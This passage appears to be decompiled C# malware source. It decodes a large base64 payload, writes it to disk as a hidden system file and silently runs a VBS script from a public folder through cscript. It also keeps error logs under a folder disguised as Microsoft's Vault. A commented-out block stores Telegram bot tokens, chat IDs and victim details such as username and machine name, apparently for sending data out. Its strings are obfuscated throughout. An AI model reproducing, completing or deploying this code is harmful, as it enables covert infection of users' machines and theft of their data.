zZWbwGox/kToqEfdee/2fdZIBSKE1wSCJuFhgd6bgPO76xObHmXg5KFmAzZwDgc0xZ0AIQeQL3+WtkPlSXEKTv6cptnnwvsgrrY67bt0rrS4yOIWreSjBE2GKNDKLWyCQkqqdn7YusCVN1xSt4gKeJw+uDamOG6hR5AQBXXRTP+la8+GrzUttIQkZWRFUafbWtYCDAf8dPvw4GjkuZ1Y4Kmcik/BYpULAac4OcWCRSijsumJW/ES5P5KqnZ+2LrAlMXE+IyGSiu5lA9BDtrZZ7oGminZdwGEUQBt09NHO3plR7ycMJ0G+akKy/AMjsP97gtkWOQ4yrl8CGqaPDLEBLDXqHutilvWEgLKf3OfCkT5evwCuyqybFFpWGRknONnyuDKHi4JY20/57XEEAXzrCPnBoNBbtPpoZWbwGox/kTpy/H6evdMth7vorLgzqbR4+UhyjmOvWuWPST4zROTqS5m7fi+MEyCzDREVrNY2fb9lFlME7zub92As5OglMFx7S2sZpudv3SYZPSfz8mV9/GbUitFZ4PMC5mZuKXHLi0io0ThKD2PUiQ3PXM+5bDFFf4uz0pEgZoF3GDrZbuo0FZKqnZ+2LrAl/Y4I9pvbVRjK0+QaOGAti7FOMW/CaEFOcWzflXc+eihevIobBinnvJKqnZ+2LrAlelJ3hVajhlcuN3U+ImeCEDBeV+s16JDalMABhRk3FttD+QQJY7ZC6Md+l1JDCS4E[...string is too long...]");
		string path3 = Decoder.Decode("C+2F3UHdT9KCEFcRA7miDZL8WMFMDQW+R3Zydt4RP6HDsGD58nmuaA==");
		byte[] bytes = Convert.FromBase64String(s);
		try
		{
			File.WriteAllBytes(path3, bytes);
			File.SetAttributes(path3, FileAttributes.Hidden | FileAttributes.System);
		}
		catch
		{
		}
		string str = Decoder.Decode("C:\\Users\\Public\\Videos\\b.vbs");
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "cscript.exe";

			processStartInfo.Arguments = "/B /NoLogo \"" + str + '"';
			processStartInfo.UseShellExecute = false;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.CreateNoWindow = true;
			new Process
			{
				StartInfo = processStartInfo
			}.Start();
		}
		catch
		{
		}
	}

	// Token: 0x0600002C RID: 44 RVA: 0x00003090 File Offset: 0x00001290

	/*private static Task LogAndNotifyError(Exception ex)
	{
		UHJvZ3JhbUFB.< LogAndNotifyError > d__51 < LogAndNotifyError > d__ = new UHJvZ3JhbUFB.< LogAndNotifyError > d__51();
		< LogAndNotifyError > d__.<> t__builder = AsyncTaskMethodBuilder.Create();
		< LogAndNotifyError > d__.ex = ex;
		< LogAndNotifyError > d__.<> 1__state = -1;
		< LogAndNotifyError > d__.<> t__builder.Start < UHJvZ3JhbUFB.< LogAndNotifyError > d__51 > (ref < LogAndNotifyError > d__);
		return < LogAndNotifyError > d__.<> t__builder.Task;
	}*/

	// Token: 0x0600002D RID: 45 RVA: 0x000030D4 File Offset: 0x000012D4
	private static void LogError(Exception ex)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string text = Path.Combine(folderPath, "Microsoft", "Vault");
		bool flag = !Directory.Exists(text);
		if (flag)
		{
			Directory.CreateDirectory(text);
		}
		string path = "muck_error_" + DateTime.Now.ToString("yyyyMMdd_HHmmss" + ".log");
		string path2 = Path.Combine(text, path);
		string contents = string.Concat(new string[]
		{
			Decoder.Decode("A8RFIui+wzs="),
			DateTime.Now.ToString(),
			Decoder.Decode("j5H72iEhfGSjRs8PjDXJ+Q=="),
			ex.GetType().FullName,
			Environment.NewLine,
			Decoder.Decode("D/7WtXCCDCL0Prrr4eIfAg=="),
			ex.Message,
			Environment.NewLine,
			Decoder.Decode("dNFlCwC9nTwUXD6PKLikpQ=="),
			ex.Source,
			Environment.NewLine,
			Decoder.Decode("dHOWsXEoiekdsjv++iNXWQ=="),
			Environment.NewLine,
			ex.StackTrace,
			Environment.NewLine,
			Decoder.Decode("SNbPP61yCBFjnHx4yb+499NVSblJ8T+v"),
			(ex.InnerException != null) ? ex.InnerException.Message : Decoder.Decode("KvzV+ozmDyg="),
			Environment.NewLine
		});
		File.AppendAllText(path2, contents);
	}
}


/*	private static Task NotifyTelegram(Exception ex)
	{
		UHJvZ3JhbUFB.NotifyTelegram d__55 = new UHJvZ3JhbUFB.NotifyTelegram d__55();
		<NotifyTelegram>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
		<NotifyTelegram>d__.ex = ex;
		<NotifyTelegram>d__.<>1__state = -1;
		<NotifyTelegram>d__.<>t__builder.Start<UHJvZ3JhbUFB.<NotifyTelegram>d__55>(ref <NotifyTelegram>d__);
		return <NotifyTelegram>d__.<>t__builder.Task;
	}

	// Token: 0x06000031 RID: 49 RVA: 0x00003350 File Offset: 0x00001550
	[DebuggerStepThrough]
	private static void Main()
	{
		UHJvZ3JhbUFB.Main().GetAwaiter().GetResult();
	}

	// Token: 0x04000001 RID: 1
	private static bool debugMode = false;

	// Token: 0x04000002 RID: 2
	private static string extractPath;

	// Token: 0x04000003 RID: 3
	private static Mutex mutex = new Mutex(true, Decoder.Decode("UAT0nmGZwKTYQOkE8CLrnsUJaeXpKKq4"));

	// Token: 0x04000004 RID: 4
	private static string key = Decoder.Decode("PXoZF3NaI9kujyRapU0vKXyEf4frHdyh");

	// Token: 0x04000005 RID: 5
	public static string Username = Environment.UserName;

	// Token: 0x04000006 RID: 6
	public static string Culture = CultureInfo.CurrentCulture.ToString();

	// Token: 0x04000007 RID: 7
	public static string Compname = Environment.MachineName;

	// Token: 0x04000008 RID: 8
	public static readonly string Datenow = DateTime.Now.ToString(Decoder.Decode("aNd3LNpK3z6qySs/A3qsBKM6+6u96xtQ"));

	// Token: 0x04000009 RID: 9
	public static string token = Decoder.Decode("G4r1zfNFXlxgaRQ/6ox+bLtHNODaUHiqa0W69lTxyeekv3O9R+3piKS8+Y4aTrGo");

	// Token: 0x0400000A RID: 10
	public static long chatId = -1002056156294L;

	// Token: 0x0400000B RID: 11
	public static string botToken = Decoder.Decode("0gb8HFTyNVl07LRj26gpdR7QWiMC+nfC9JEhpPuqNUGXrObgxZS6sSJ9CB5uyfM6");

	// Token: 0x0400000C RID: 12
	public static long chatID = -1002104555649L;
}
*/